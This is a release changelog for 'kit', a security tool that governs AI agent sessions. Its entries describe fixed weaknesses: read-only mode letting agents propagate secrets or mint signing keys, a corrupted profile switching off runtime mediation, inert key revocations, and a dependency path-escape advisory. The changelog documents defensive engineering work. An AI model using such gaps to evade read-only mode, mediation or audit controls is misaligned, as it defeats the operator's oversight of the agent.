- **The ROADMAP recorded a limitation without its condition.** The upstream ask
  about the SDK's HTTP/OAuth dependencies was marked "cannot be filed from kit's
  own tooling — any repository outside the allowlist answers 403". Measured:
  `gh issue list --repo modelcontextprotocol/typescript-sdk` exits 0. The 403
  belonged to a different constraint (a cloud session's GitHub token is scoped to
  its one attached repo) and had been copied onto a local-session item where it
  never applied — so an actionable item sat parked as impossible. The ask also
  already existed upstream as
  [typescript-sdk#1924](https://github.com/modelcontextprotocol/typescript-sdk/issues/1924),
  so kit contributed its runtime trace to that thread instead of filing a
  duplicate: the issue and its comment both argue from install counts, and nobody
  had shown which packages execute.

- **`docs/VERIFY.md` documented a `gh attestation verify` invocation that
  exits 1.** Both the copy-pasteable block and the CI snippet passed
  `--owner sandstream --repo kit`; the two flags are alternatives and
  `--repo` wants the full `owner/repo`, so gh 2.96 answers
  `invalid value provided for repo: kit`. It survived because the
  surrounding caveat said the attestation did not exist yet, so nobody
  expected the command to succeed — a broken instruction hiding behind a
  true caveat. `src/docs-verify-commands.test.ts` now gates the flag
  grammar in `VERIFY.md`, `README.md` and `publish.yml` (offline and
  deterministic; a doc test needing Sigstore would be skipped in CI and
  therefore worthless), mutation-proved by restoring the old form: 2 fail.

### Changed

- **The GitHub artifact attestation is measured, so the docs stop hedging.**
  `gh attestation verify sandstream-kit-6.3.2.tgz --repo sandstream/kit`
  exits 0 with exactly one subject, `digest.sha256 = de2f6328…85dd`,
  `predicateType: https://slsa.dev/provenance/v1`, and a `buildSignerURI` of
  `publish.yml@refs/tags/v6.3.2` — verified against a tarball whose sha512
  equals npm's own `dist.integrity`, so the GitHub attestation and the npm
  provenance describe the same bytes (run `30890753307`). Accordingly:
  VERIFY.md's caveat is reduced to the fact consumers still need (nothing to
  verify on ≤6.3.1) and now carries the measurement; the CI snippet's
  attestation gate is **blocking** again, with the `|| echo "::warning::…"`
  removed on the grounds that a warning in a CI log is indistinguishable
  from a passing check to anyone not reading the log; and the OWASP A08 row
  stops citing "the step is in publish.yml" as evidence — the step was
  always there and always errored, which is exactly the reasoning that let
  it survive.

## [6.3.2] - 2026-08-04

### Added

- **`[policy.agent_writes]` is now enforced — narrowing-only, wired at the
  choke point.** `policy-gate.ts` gates all six vendor `env_set` propagation
  writes at `propagate()`'s single choke point, plus Supabase rotation, where
  `scoped_key_mint` and `jwt_secret_roll` are separate ops because a roll
  invalidates every live token and a mint approval must not authorise it. The
  semantic is deliberately not a grant: the block is unsigned config, so
  policy may add a denial and never remove one; elevation, read-only and
  approval stay authoritative. Four distinct states (`inert` /
  `unconfigured` / `approved` / `denied`) keep "vendor absent" separate from
  "vendor declared with an empty list" — **a declared vendor block whose list
  omits the op now refuses**, where the table previously gated nothing. Every
  enforced decision, refusal and grant alike, writes a `policy-check` audit
  event carrying the vendor, op, `policy_state` and policy hash into the
  governed project's log, and `unknownPolicyEntries()` reports config naming
  an op kit never asks about, so a typo'd `env-set` surfaces instead of
  silently granting nothing (#442).

### Fixed

- **`KIT_READ_ONLY=1` did not stop `kit secrets propagate`.** Propagation
  writes a secret into a third-party control plane, and with elevation
  satisfied, `KIT_READ_ONLY=1 kit secrets propagate API_KEY --value x --to
  vercel` reached `spawn vercel` — nothing refused it.
  `read-only-surface.ts` omitted `secrets` because writes are "already
  refused inside their own modules": true of the local backend write, false
  of propagation. Now gated at `propagate()`'s choke point, ordered before
  the policy gate so a locked-down session answers "read-only" rather than
  "your policy is missing an entry" (#442).
- **The GitHub artifact attestation never ran — on any release.**
  `subject-path: dist/**/*` matched 1920 files against the action's hard
  limit of 1024 subjects, so the attest step errored in 327 ms on every
  publish, and `continue-on-error: true` reported it to the jobs API as
  success. The step now packs the tarball first and attests that — one
  subject, the same bytes npm publishes — and a following step writes the
  outcome to the run annotations and job summary, so a swallowed failure can
  no longer read as green. Releases up to and including 6.3.1 carry npm
  provenance and a signed tag but no GitHub artifact attestation; 6.3.2 is
  the first release where one can exist (#441).
- **A governed operation now measures and files evidence in the governed
  project's tree, not the calling process's.** Five fail-opens closed by
  threading `cwd` end to end: the exec broker resolved the unsigned policy
  from `process.cwd()`; `kit check`'s filesystem dimensions scanned the
  calling tree; `kit fix`'s write path had the asymmetry backwards; audit
  evidence was filed in the wrong project; and the review design stage
  measured the calling process's tree instead of the reviewed one (#441).
- **A value flag means the same thing with a space and with an `=`.** The
  argv sweep is finished: one guarded idiom for value flags across the CLI
  (#441).
- **`policy-cwd.test.ts` compared a `mkdtemp` path against a `cwd`-derived
  one**, which on macOS resolves through the `/var` → `/private/var` symlink.
  Green on the Linux runner, red on a maintainer's machine — the temp root is
  realpath'd so the pair proves the behaviour rather than the platform.

### Changed

- **`mcp-server.ts` migrated from the deprecated `server.tool()` overload to
  `server.registerTool()` (MCP SDK ≥ 1.30).** All ten registrations now pass
  `{ description, inputSchema }` config objects; the tool surface (names,
  descriptions, input schemas) is unchanged, verified by a live client
  round-trip. The R8 self-audit extractor recognizes both registration forms
  so a tool added through either API can never dodge read-only-guard
  classification. Closes the TS6387 deprecation warnings introduced by the
  SDK 1.30.0 bump (#437).
- **The MCP server serves a cross-project `cwd`.** The blanket refusal is
  lifted after measuring the guard it rested on: the cross-project comparison
  comes from real, symlink-resolved paths, so a governed project can be
  served from a different working tree without weakening the boundary (#441).

### Security

- **`@modelcontextprotocol/sdk` 1.29.0 → 1.30.0, pulling the transitive
  `@hono/node-server` from 1.19.14 to 2.0.12.** The 1.x line carries
  GHSA-frvp-7c67-39w9 (CVSS 5.9): on Windows hosts an encoded backslash
  (`%5C`) in a request path decodes to `\`, which the Windows path resolver
  treats as a separator, letting `serve-static` escape its root. Kit's MCP
  server runs over stdio and never serves static files, so no kit code path
  was exploitable — but the lockfile pin kept `osv-scanner` red on every
  `kit check`. The fix only exists in the 2.x line, and SDK 1.30.0 is the
  first release whose range (`^1.19.9 || ^2.0.5`) admits it.
- **`brace-expansion` 5.0.9 (GHSA-rgw5-rvv9-x895) and `fast-uri` 3.1.5
  (GHSA-7p8r-x3mc-p8w7).** brace-expansion was dev-only, via eslint; fast-uri
  ships to consumers and is on the live path — `ajv` compiles kit's ten MCP
  tool schemas on every server start and resolves `$ref` URIs through it
  (#441).
- **The inherited dependency surface is measured and guarded: 120 packages
  installed, 9 loaded.** `@modelcontextprotocol/sdk` accounts for 91 of the
  120 because it hard-declares a complete HTTP server and OAuth stack for
  transports kit never uses. kit speaks stdio and loads none of them, traced
  across both module systems — an ESM resolve hook alone misses CommonJS
  loads and would have reported a confident wrong answer.
  `src/mcp-dependency-surface.test.ts` is a guard, not a report: it fails if
  a future SDK release pulls the HTTP stack into the stdio path (#442).

## [6.3.1] - 2026-08-03

### Fixed

- **The 6.3.0 first-publish of the adapter SDK and plugins failed provenance
  validation.** npm's sigstore check requires each workspace `package.json` to
  carry a `repository.url` matching the provenance source
  (`https://github.com/sandstream/kit`); the field was empty, so the registry
  rejected `sandstream-kit-adapter-sdk` with E422 and the eleven plugins never
  ran (the CLI itself published). All thirteen manifests now declare
  `repository` (with the monorepo `directory` field); the publish step is
  idempotent, so this tag completes the set the 6.3.0 tag started.

## [6.3.0] - 2026-08-01

### Security

- **The adapter SDK and the eleven first-party plugins are now published to npm.**
  `packages/` was never in the root tarball, so every workspace was unreachable
  to anyone who had not cloned the monorepo — while the docs advertised the
  snyk/wiz plugins as shipped controls and told third-party authors to
  `npm install sandstream-kit-adapter-sdk`. That name returned 404:
  unregistered, therefore claimable — a dependency-confusion invitation created
  by our own documentation. The publish workflow now ships root → adapter-sdk →
  plugins (peer first), idempotently (an already-published version is skipped,
  a failed publish is never continue-on-error), with provenance, and a
  pre-publish gate asserts the SDK stays on its frozen 1.x contract and that
  every plugin's peer range admits the SDK version being shipped.
- **`KIT_READ_ONLY=1` let four commands write anyway.** `kit identity init`
  minted a private key, `kit policy init` wrote policy, `kit security
  check-gitignore --fix` rewrote .gitignore, and `kit upgrade` rewrote lock
  files — none refused, none audited. The worst is the first: an operator who
  locks an agent session down believing every mutation is refused, while the
  agent mints the signing identity that then attributes audit and policy
  signatures. All four now refuse with the standard audited denial, and a new
  read-only surface test enumerates every mutating command against the flag.
- **`kit_check` answered about the wrong project — and `kit_fix` wrote into it.**
  The MCP tools' `cwd` argument was used to load `.kit.toml`, but every check
  dimension resolved paths from the server process's working directory: a
  client asking about project B got a security verdict earned by project A
  (proven with a discriminating probe — B had no .gitignore and still "passed"),
  and `kit_fix` created B's lock files inside A. Cross-project calls now
  FAIL CLOSED with an actionable error instead of a verdict about the wrong
  tree; threading `cwd` through all ten dimensions is on ROADMAP as its own
  change. The guard compares real paths (macOS's `/tmp`/`/var` symlinks made a
  lexical compare refuse the same directory).

### Fixed

- **`kit auth elevate --list-scopes` escalated instead of listing.** The flag
  was discarded and the command fell through to an interactive elevation prompt
  for scope=all — someone asking WHAT SCOPES EXIST was one keypress from
  granting themselves everything. It now lists every scope with its description
  and one-shot status (`--json` for machines) and elevates nothing. In the same
  sweep: `--limit=25` / `--ttl-minutes=60` (the `=`-form) were silently dropped
  by hand-rolled `indexOf` parsing at two call sites — both parse now.
- **Every pattern `check-gitignore --fix` wrote was ignored by git — and kit
  called it pass.** gitignore(5) has no trailing-comment syntax, so the
  annotated `*.pem  # PEM keys` entries the fixer appended matched nothing;
  the parser then stripped the same comments and reported the patterns present.
  Writer and parser agreed with each other and both disagreed with git — a
  checker that reads its own output as evidence cannot fail. Fixed on all
  sides: comments go on their own line, presence is verified the way git reads
  the file, and a regression test pins the round-trip against `git check-ignore`.

### Added

- **Dependabot config for GitHub Actions.** The OWASP A06 row claimed it;
  `.github/dependabot.yml` did not exist. All 56 workflow `uses:` are pinned to
  full commit SHAs (the right posture) — but a pinned SHA never moves, so
  pinning without an update path just trades one supply-chain risk for another.
  Weekly, grouped into a single PR; npm is deliberately excluded (dependency
  changes go through `kit triage`, not around it).

### Fixed

- **Three defects found by testing the README's pillars as behaviour, not as prose.** Each pillar
  claim was run against a temp project and its artifacts, with the oracle being what kit *did* —
  never the text that made the claim.

  - **A corrupted `.kit-profile.toml` turned runtime mediation off entirely.** Pillar 3 says
    mediation is on by default in observe mode. It is — but an *unreadable* profile resolved to
    `runtimeMode: "off"`, and `runBrokered` skips the broker on "off". Tampering with
    `.kit-profile.sig` was denied while breaking the TOML syntax ran unmediated: the strictly
    easier attack had the weaker consequence, and the comment on that branch already claimed the
    opposite ("a broken artifact must not silently disable enforcement"). An unreadable profile
    now default-denies any op that declares effects, with a reason naming the actual fault, while
    undeclared ops keep the migration passthrough so a typo cannot brick the runtime and push
    operators into deleting the profile.

  - **kit could not verify what it had just signed with a hardware key.** `kit profile sign` under
    `KIT_KEYSTORE=command` printed "signed (hardware-rooted)"; `kit profile verify` one second
    later on the same machine answered "signer &lt;kid&gt; unknown". The local trust store is built
    only from `identity.json` and its `.bak` archives, so an operator-fronted key was never
    written down. Consequence: `exec-broker scope` read "unverifiable → grants nothing", so
    adopting the hardware backend Pillar 1 recommends silently disabled the mediation Pillar 3
    promises. A successful sign through a non-file backend now records the signer's **public** key
    (0600, no private material) as a locally-trusted identity.

  - **`kit identity migrate` revoked nothing.** It wrote a revocation of the old file key signed by
    the new hardware key, but `isAuthoritativeRevocation` rejects a revoker whose public key is
    unknown — so the record was inert: the "revoked" key kept signing profiles and policies,
    `kit identity show` looked healthy and `kit doctor` said nothing. The external key is now a
    local revocation authority, **and** any backend refuses to sign a key this machine has revoked.
    The verifiers deliberately do not honor a machine-local revocation of a third party (that would
    let one host fail-close everyone), which is precisely why the local revocation has to bite on
    the signing side. `kit doctor` fails and `kit identity show` prints REVOKED.

  Both keystore wrappers are installed inside `resolveKeyStore` rather than at the six
  `store.sign()` call sites, so the seventh one added gets them too.

- **`kit profile sign` told you to commit a file it does not write.** The message named
  `.kit-profile.toml.sig`; the file is `.kit-profile.sig`. Following the instruction left the
  signature uncommitted and every verifier reading the scope as unsigned.

- **`kit security scan-staged` no longer blocks on test fixtures.** The pre-commit gate flagged
  kit's own audit-**redaction** test — which has to stage a secret-shaped key to prove the
  redaction works — and the only way through was `git commit --no-verify`, which switches off the
  entire hook. A gate that cries wolf teaches people to disable it.

  `check-security.ts`'s repo-wide grep already made this call, with the reasoning written out:
  fake credentials live in test/fixture files by design, and the authoritative scanners
  (trufflehog locally, the CI gitleaks job) still scan them and verify live. The two surfaces of
  the same check simply disagreed, and the disagreeing one was the one that blocked work. The
  rule now lives in one place (`utils/test-paths.ts`) so they cannot drift again.

  Test-path hits are **reported as advisories, not dropped** — no false green, just no false
  block. Verified in both directions: the redaction test now reports and exits 0, and a
  secret-shaped string staged in ordinary source still blocks with exit 1.

- **Three real defects found by covering the unwired exports.** Writing tests for code nothing
  calls is usually bookkeeping; here it surfaced bugs in live paths, because two of the three
  functions share their flaw with a wired sibling.

  - **`lineSeals` / `lineHashes` threw instead of failing closed on a `null` log line.**
    `JSON.parse("null")` *succeeds* and yields `null`, and the `typeof obj.hash` guard sat
    **outside** the `try` — so a line containing exactly `null` in `.kit-audit.jsonl` escaped as
    a `TypeError` rather than the fail-closed `null` every other malformed line gets. `lineSeals`
    is the **live** extractor `verifyAgainstAnchor` calls, so this turned a documented
    "unparseable" verdict into a thrown exception out of the audit-verify path. **A crash is not
    a verdict.** Both now guard the parse result; every other malformed shape (bare number,
    string, array, truncated object) already behaved correctly.
  - **`wouldRequireApproval` disagreed with the enforcer it predicts.** It gated prod on
    `production_writes === true` while `requestApproval` gates on bare truthiness, so a
    hand-edited `production_writes = "yes"` made a dry-run report *no approval needed* and the
    real call then prompt or deny. It also ignored `enabled` entirely, predicting a prompt for
    configs where `withGovernance` returns before any approval is requested. Both corrected
    toward the enforcer: a predictor may over-predict a prompt, never under-predict one.
  - **`mergeGovernanceConfig()` handed out the shared defaults by reference.** With no config it
    returned `DEFAULT_GOVERNANCE` itself, so one caller pushing a keyword onto
    `approval.destructive_operations` changed the destructive-operation gate for every later
    caller in the process. Now a `structuredClone`; the configured path already returned a fresh
    object via spreads, so only the no-config path leaked the singleton.

### Added

- **Every unwired export now has tests — 276 cases across 27 files, ~3,760 lines.** The user's
  instruction was explicit: delete nothing, cover it. So each export `self-audit` rule 15 reports
  as having no production call site is now verified rather than merely unused, and three of them
  turned out to be hiding real bugs (above).

  Run as a 27-agent workflow with file-level ownership so concurrent writes could not collide,
  append-only against the existing sibling test files. Two assumptions the agents made were
  wrong and the failures were the point — `ensureMiseActivation` inserts no blank separator line
  when a profile lacks a trailing newline (the leading `\n` in its block is what prevents
  gluing, which is the property that actually matters), and the `null`-line expectation had to
  flip from "throws" to "returns null" once the defect it documented was fixed.

- **Tests for four untested security-decision modules — 91 new cases.** Targeted by what a bug
  in them would cost, not by line count: every one is logic where a defect is an authorization,
  injection or ledger-integrity bug, and none of them had a single test.

  - **`rbac/policy-schema.ts`** (34 cases) — the RBAC decision engine. Wildcard scope
    (`secrets:*` must not grant `secretsadmin:read`), that a grant is never treated as a regex,
    prototype-pollution refusal at all three levels (`__proto__` / `constructor` / `prototype`
    on the table, as a role name, inside a binding), and the fail-closed contract the resolver
    depends on: a malformed `[rbac]` table yields `null`, never a partial grant.
  - **`governance.ts`** (24) — `checkOperationAllowed`, the authorization verdict. The
    intentional fail-open when governance is disabled, the fail-closed branch for an
    environment with no access entry, and the deliberate asymmetry that a denied *delete* is
    always escalatable to approval while a denied *write* is only escalatable in prod.
  - **`findings-track.ts`** (18) — which findings reach the PAL ledger, and that `dedupKey`
    excludes volatile values so a re-scan maps to the same row instead of forking a new one.
  - **`utils/ci-escape.ts`** (15) — the two escapers standing between a config-controlled
    string and a forged CI annotation or JUnit testcase. Both pin that the escape character
    itself is escaped **first**, since escaping `%` or `&` last lets the sequence be smuggled
    through intact.

  Three of these tests were wrong on the first run and the failures were the point:
  `mergeGovernanceConfig` always spreads all three environments (so the no-access branch is
  only reachable by a caller assembling config itself — now documented in the test),
  `"removal"` does not contain `"remove"`, and `advisory.detail` is required rather than
  optional. Each assertion was corrected to describe the code, not the other way round.

  Untested files **89 → 85**.

### Fixed

- **A false security claim in the README and in three compliance evidence maps.** kit's Pillar 2
  entry stated in the present tense that *"keyless egress signs requests with RFC 9421 HTTP
  Message Signatures for hosts in `[scope].sign`"*. Measured: the whole `src/keyless/` directory
  is unreachable — `http-sig.ts` is imported only by `sign-request.ts`, which is imported by
  nothing; no command exposes it; nothing on the egress path signs a request; and there is no
  `[scope].sign` field in the profile schema at all.

  The primitives are real and tested, so they stay. What changed is every place that described
  them as shipped: the README, **`coverage/nist-800-53.ts` (both the IA and SC families)** and
  **`coverage/owasp-agentic-top10.ts`**, where "keyless egress" was also listed as one of the
  *checks* backing a control. Evidence you would hand an auditor is the worst possible place for
  a capability claim that is not wired, which is why this one is called out separately from the
  dead code below.

  (Care taken not to overclaim in the other direction: "keyless" in `kit audit verify` means a
  keyless *hash chain* — no identity key — which is a different, working thing that happens to
  share the word.)

- **A false positive in rule 15, found by reading its own output instead of trusting it.**
  `buildOpenCliDoc`, `serializeOpenCli`, `collectPublicSurface` and `serializePublicSurface` were
  reported as unwired. They are called by `scripts/gen-opencli.mjs` and
  `scripts/gen-public-surface.mjs` via `await import(dist/…)` — reachable, load-bearing, and
  invisible to a rule that only scanned `src/`. Repo tooling now counts as a call site, with a
  test pinning it.

### Removed

- **~1,100 lines of unreachable code, found by rule 15 and deleted.** Every export it flagged as
  *referenced nowhere* is gone, and the count went **20 → 0**:

  - `src/event-stream.ts` (220 lines) plus its 299-line test — an `EventStream` class with
    `initializeEventStream` / `getEventStream`, imported by **nothing**. Tested, complete, and
    unreachable: the module-level version of the shape rule 15 exists to catch. No doc promised
    it.
  - `src/validation/` (69 lines) — the whole directory. `validateWebSearchConfig` and
    `getValidProviderNames` were dead, and removing them orphaned the schema builder they were
    the only callers of; nothing outside the module used any of it either.
  - 14 further exports across `migrations.ts` (4 query helpers), `fix.ts`, `onepassword.ts`,
    `adapters/resend-email.ts`, `utils/promptSelect.ts`, `triage-sandbox.ts`, `revocation.ts`,
    `secrets-pull.ts`, `service-adapter.ts` and `profile/sign.ts`, plus the types and private
    helpers the deletions orphaned.

  Checked before deleting, not after: no non-source reference (docs, JSON, workflows, scripts),
  no dynamic dispatch that could reach them (every `await import()` in the tree takes a static
  string), and nothing in the declared adapter-SDK public surface. `tsc` then caught each
  orphaned import in cascade — including one where **the deletion was wrong**: `installTools` is
  used by the live `cmdFix`, and removing its import broke the build until it was restored.
  That is the whole reason this was done with the compiler and 3,391 tests as the net rather
  than by eye.

  Net effect on the tracked numbers: unwired exports **69 → 49**, referenced-nowhere **20 → 0**,
  untested files **91 → 90**.

- **A further ~2,000 lines: four orphan modules, each a duplicate of something that works or a
  design that was never wired.** Nothing in the tree imported any of these files.

  - `src/secrets-service.ts` (437 lines) + its test + `src/secrets-model.ts` (91, orphaned by
    the removal) — a parallel vault service with sharing, revocation, access logs and metrics.
    `kit secrets` is the real, working implementation; this was an alternative design.
  - `src/control-plane/` — `applyPolicyBundle` / `fetchPolicyBundle`. `kit policy pull` and
    `pull-revocations` **do work**, implemented in `commands/policy.ts`; this was a duplicate.
    Verified by running both subcommands before deleting.
  - `src/plugin-registry.ts` — a class-based `PluginRegistry` duplicating the live interface in
    `src/plugins.ts`.
  - `parsePolicyToml` in `policy-doc.ts`, orphaned by the control-plane removal.

  `src/keyless/` was **kept**: unlike these, it is not a duplicate — it is a real primitive
  nothing has wired yet, so the fix was to stop claiming it (above) rather than delete it.

  Tracked numbers after this batch: unwired exports **49 → 32**, referenced-nowhere back to
  **0**, untested files **90 → 89**.

  **Not done, deliberately:** the 32 remaining *tested-but-never-called* exports in live
  modules. A bulk brace-matching pass over 26 of them corrupted `cost-monitor.ts` (it removed 30
  functions where 26 were named) and was reverted whole. They are dead weight, not false claims,
  and the tracked number is a better outcome than a broken tree at the end of a long change.

### Added

- **`[memory] default_class` and `KIT_MEMORY_CLASS` are now actually read.** Before this they
  were inert: `resolveMemoryClass()` had **zero** production call sites, so the documented
  precedence (`KIT_MEMORY_CLASS` → `[memory] default_class` → `internal`) never ran on real
  inputs, and both settings did nothing at all. The policy in `memory/class.ts` was complete and
  unit-tested the whole time — which is precisely why `self-audit` rule 15 landed in 6.2.0, and
  this is its first finding closed.

  `memory/effective-class.ts` supplies the missing wire (env + the project's `.kit.toml`), and
  `kit memory stats` now reports which class applies and where it came from:

  ```
  class      internal (from built-in default)
             resolved and reported; recall is not yet filtered by class
  ```

  An unrecognised value fails closed to `restricted` and **says so out loud** in that line,
  because a typo that silently narrows disclosure is as much a defect as one that widens it.

  **Observe tier, deliberately.** This resolves and reports; it does not yet filter recall.
  Turning on disclosure filtering changes what an existing store returns — a wrong flip either
  leaks across projects or silently hides a user's own notes — so it is a separate, explicitly
  tested step on kit's own observe→enforce ladder rather than a side effect of making the
  config readable. The `kit memory stats` line states that limit rather than implying more.

## [6.2.0] - 2026-07-31

### Added

- **`kit check --category <dim>` now exists.** It was documented in kit's own README,
  `CLAUDE.md`, `AGENTS.md`, the `CLAUDE.md` template kit **generates into every user's
  project** (`agent-config.ts`), the example Codex and pre-commit hooks, a runtime hint kit
  prints after a check, and the Windows CI workflow — and **nothing parsed it**. Every one of
  those callers ran the full check. Measured: `kit check` → 40 checks;
  `kit check --category security` → 40 checks; `kit check --totally-fake-flag` → 40 checks,
  accepted.

  It now narrows for real (40 → 23 on kit's own repo) across `tools`, `services`, `secrets`,
  `skills`, `hooks`, `web`, `security`, `locks`, `tests`, and accepts a comma-separated list.

  A narrowed run **cannot be mistaken for a full one**: `CheckRunResult.scope` and the
  `--json` `scope` field name the dimensions that ran, and the human output prints
  `partial run — only <dims> ran; this verdict does NOT cover the other dimensions`.
  Dimensions that did not run are absent, never synthesised as passes. An unrecognised
  `--category` value is an error, not a fallback to a full run.

- **`kit check` rejects unknown flags.** Every `kit check` form now validates argv against an
  explicit allowlist and exits non-zero on anything else. A flag that silently does nothing is
  the same class of defect as a check that silently does not run — and it is how
  `--category` stayed broken across six majors. `unknownFlags()` in `utils/flags.ts` is the
  reusable, tested primitive.

- **The test-coverage gate runs in CI.** `--enforce-tests` existed for six majors and was
  invoked by **zero** workflows. `ci.yml` now runs
  `kit check --category tests --enforce-tests`, and `.kit-baseline.json` is **committed** (it
  was gitignored, so the freeze died with the machine and CI saw no baseline at all). The 91
  pre-existing untested files are frozen; a net-new untested source file fails the build.
  Verified both ways: frozen → `ok: true`, one new untested file → `ok: false`, exit 1.

  Only the `tests` category was frozen. The 158 typescript-standards and 16 design-token
  findings a full `kit baseline freeze` also captured were **deliberately dropped from the
  committed baseline** — freezing those would have suppressed live findings under the guise of
  progress.

- **Rule 14 also resolves documented `KIT_*` env vars against the code that reads them.**
  78 references across 63 docs. A documented switch no code branch on is a *silent
  false-secure*: the user believes a control is on. The oracle counts a name as known if the
  implementation reads it via `process.env.X`, via a destructured `env.X` (how
  `airgap/config.ts` does it), or sets it for a child process — generous on purpose, so only a
  name the implementation never touches is reported. Test files do **not** count: a pure
  resolver unit-tested in isolation with zero production call sites does not make the claim
  true, which is exactly the shape of the memory-class finding below.

- **`self-audit` rule 15 — wiring integrity.** The machine answer to "don't write unfinished
  code": an exported production function with **no production call site** is reported, split
  into two tiers because they mean different things —

  - **tested but never called** — built, unit-tested, unreachable. The dangerous shape: it looks
    finished from every angle a reviewer checks. This is exactly the classified-memory defect
    (`resolveMemoryClass` had 0 production callers while its tests passed).
  - **referenced nowhere** — plain dead code, safe to delete.

  kit's own tree: **69**. The oracle is deliberately *not* the test suite — a green unit test is
  not evidence a feature is reachable, which is the whole lesson. A helper used only inside its
  own module counts as wired (that is normal code); `_`-prefixed / `…ForTests` seams and the
  declared adapter-SDK exports are excluded with the reason in code.

  Advisory, one row per finding, same trade as flag-validation: deleting a dead export is safe,
  but deciding whether an unreachable *control* should be wired or withdrawn is a human call,
  so it reports and never gates.

- **Flag-validation coverage is now measured, not invisible.** `kit check` is the only one of
  **44** command modules that rejects unknown flags; the other 43 accept anything. Rather than
  refactor 70 commands blind — each needs its true flag list read off its own source, and
  getting one wrong breaks a working invocation — `self-audit` now reports the ratio as
  `self-audit/flag-validation: 43 command modules that accept unknown flags`, one navigable row
  per module.

  Advisory severity by design: it never gates, and `--fail-on-warning` stays green on kit's own
  tree, which `cli.test.ts` pins as an invariant. Inflating it to a real warning made the
  number print but broke that guarantee — the wrong trade, so the visibility was solved by
  emitting a row per module (the advisory renderer reports row counts) instead of by severity.
  The number can only go down, and it is now in front of anyone who runs the audit.

- **`self-audit` rule 14 — documented-claim integrity.** Every claim kit's docs make about
  kit's own surface is resolved against a machine oracle: `kit <command>` against
  `contracts/kit.opencli.json`, `--flag` against the flag literals the implementation actually
  names, and `[section]` against `config.ts` `KNOWN_SECTIONS`. A claim that does not resolve is
  now a **fail**, not something a reader discovers as `Unknown command:` at the terminal.

  This is the R11 pattern (CI script paths must resolve) applied one surface out: docs are
  instructions to humans *and* to agents, and a stale instruction is indistinguishable from a
  live one to the reader. Scanning is restricted to command position — inside code fences and
  backticked spans — because an unanchored scan matches English prose ("kit is", "kit ships")
  and buries the signal: 193 hits versus 6.

  `CHANGELOG.md` (historical record), `ROADMAP.md` (planned surface) and `docs/specs/**`
  (design documents) are exempt with the reason stated in code; those legitimately name
  commands that do not currently exist.

  A `toml` fence is only checked when it says it shows `.kit.toml` — in the fence or in the
  prose introducing it. `docs/POLICY.md` documents a *policy* file whose `[thresholds]` is
  correct there and unknown to `.kit.toml`; guessing would fire the gate on correct
  documentation.

  **Individual TOML keys are deliberately not checked.** `ServiceConfig` carries an index
  signature, so a user-defined key under `[services.*]` is legal by design and appears nowhere
  in source — an oracle over source text false-positives there (it flagged README's
  `project_ref`, which is correct usage). A gate that cries wolf is worse than no gate, so the
  unsound check was left out rather than shipped.

  Remaining scope limit, stated in the module: the flag oracle is repo-global, not per-command.
  A real flag documented on the wrong command still passes.

### Fixed


- **Two documented security switches that no code read.**
  - `KIT_REQUIRE_HARDWARE` appeared in the README, in `kit doctor`'s own remediation hint, and
    in the **NIST 800-53 evidence map** as the way to make a missing hardware key backend
    fail closed. The variable the implementation reads is `KIT_REQUIRE_HARDWARE_IDENTITY`.
    Setting the documented one did nothing at all. Corrected in all four places.
  - `docs/OWASP_2025.md` listed *"Rate-limiter failed OPEN on Redis error → Fail-closed;
    opt-in `KIT_RATE_LIMIT_FAIL_OPEN=1`"* as **✅ shipped (P0.3)**. kit has no rate limiter —
    the only match in the tree is a SQL column name — and no `KIT_RATE_LIMIT_FAIL_OPEN`
    anywhere. Row removed. The sibling rows in that table (`KIT_ELEVATED`, `KIT_PROD_OK`) were
    checked and do hold.

- **README no longer overstates classified memory.** The README described a working disclosure
  control: *"every row carries a sensitivity class, and recall never returns a row more
  restrictive than the asking context — so a note captured in a restricted repo cannot surface
  while you work in a public one."* Measured: `KIT_MEMORY_CLASS` is read in **0** places,
  `[memory] default_class` in **0**, `resolveMemoryClass()` has **0** production callers,
  **0 of 30** `openMemoryDb()` call sites pass a class, no indexer ever sets `memoryClass`, and
  `contextClass` is never supplied outside `memory/`.

  The class column, the fail-closed resolution and the recall filter are all implemented and
  unit-tested — nothing connects them, so every row takes the built-in default and the override
  is inert. The README now states that plainly. **Wiring it is a deliberate change to
  disclosure semantics and is not attempted here**; the honest description is the fix, and the
  gate above is what keeps the claim and the code together from now on.


- **Documented surface that did not exist.** Found by the rule above on its first runs against
  kit's own tree — 3 commands, 8 flags, 3 config sections:
  - `docs/PERFORMANCE_AND_DIAGNOSTICS.md` documented a metrics feature that was never built —
    a `metrics` command, a `[config]` section with `metrics_enabled` / `metrics_file`, eight
    flags (`--timing`, `--save`, `--save-baseline`, `--compare-baseline`, `--memory-check`,
    `--stream-output`, `--no-cache`, `--max-parallel`), an `[environments.*]` section (the real
    one is `[env.*]`), and sample output with plausible-looking timings. It also claimed kit
    runs its checks in parallel; `check-run.ts` runs nine dimensions sequentially with no
    `Promise.all`. Rewritten to what is verifiable, including an explicit list of what kit does
    **not** provide.
  - `docs/EXAMPLE_PLUGIN_README.md` and `docs/PLUGIN_DOCUMENTATION_STANDARDS.md` told plugin
    authors to register adapters under `[adapters]` in `.kit.toml`. There is no such section —
    `loadPluginAdapters` reads the `kitPlugins` array in `package.json`. So the plugin
    authoring docs were wrong about how to register a plugin.
  - `docs/ZERO_LLM_CONTRACT.md` listed `kit check-security` as one of the deterministic
    verdict surfaces; the real invocation is `kit check --category security`.
- **A stale command count in prose.** `src/mcp-server.ts` and `docs/MCP_TOOLS_GUIDE.md` both
  claimed 68 commands; the dispatch table has 70. Corrected, and `command-surface.test.ts` now
  asserts the documented number against `COMMANDS` — a hardcoded count in prose drifts
  silently, which is precisely the failure mode kit exists to argue against.

  The rule's own oracle got the same treatment: `PRE_DISPATCH_VERBS` (`help`, `version`,
  `completions` — real commands that `main()` handles before the dispatch table, so the
  generated contract omits them) is a hardcoded list, and a test asserts it against the live
  surface in both directions. Without it the rule reported `kit version` and `kit completions`
  as drift. A constant that exists to catch drift must not be allowed to drift itself.

## [6.1.1] - 2026-07-31

### Fixed

- **`kit skill test` no longer reports "description missing" for a description written as a
  YAML block scalar.** `description: >` (folded) and `description: |` (literal) are the common
  real-world shape — it is the longest frontmatter field — and the parser read only the
  same-line value, so a skill that declared a perfectly good description failed both the
  `contract` and `trigger` checks. That is a **false finding in a gate**, which erodes trust in
  the verdict exactly as a missed finding does.

  Found by running `kit skill test` against a **real published `SKILL.md`** (a 10.4k-star
  OSINT project shipping an agent skill), not by reading the parser. Chomping indicators
  (`>-`, `|+`, …) are handled, the block correctly ends at the next key rather than swallowing
  it, and an empty block yields an empty string rather than the literal indicator character.


## [6.1.0] - 2026-07-31

### Added

